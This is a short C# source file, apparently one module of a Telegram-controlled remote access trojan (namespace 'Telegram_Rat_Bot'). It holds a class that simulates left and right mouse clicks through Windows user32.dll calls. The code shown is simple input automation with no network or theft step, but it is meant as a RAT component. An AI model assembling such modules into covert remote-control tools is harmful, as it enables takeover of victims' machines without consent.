using System.Runtime.InteropServices;

namespace Telegram_Rat_Bot
{
    public class ClickMouse
    {
        public void LeftClickMouse()
        {
            POINT p = new POINT();
            GetCursorPos(ref p);
            DoMouseLeftClick(p.x, p.y);
        }

        public void RightClickMouse()
        {
            POINT p = new POINT();
            GetCursorPos(ref p);
            DoMouseRightClick(p.x, p.y);
        }

        [StructLayout(LayoutKind.Sequential)]

        public struct POINT
        {
            public int x;

            public int y;
        }

        [DllImport("user32.dll")]
        public static extern void mouse_event(int dsFlags, int dx, int dy, int cButtons, int dsExtraInfo);

        public const int MOUSEEVENTF_LEFTDOWN = 0x02;
        public const int MOUSEEVENTF_LEFTUP = 0x04;

        public const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        public const int MOUSEEVENTF_RIGHTUP = 0x10;

        private void DoMouseLeftClick(int x, int y)
        {
            mouse_event(MOUSEEVENTF_LEFTDOWN, x, y, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0);
        }

        private void DoMouseRightClick(int x, int y)
        {
            mouse_event(MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0);
            mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
        }

        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(ref POINT lpPoint);
    }
}
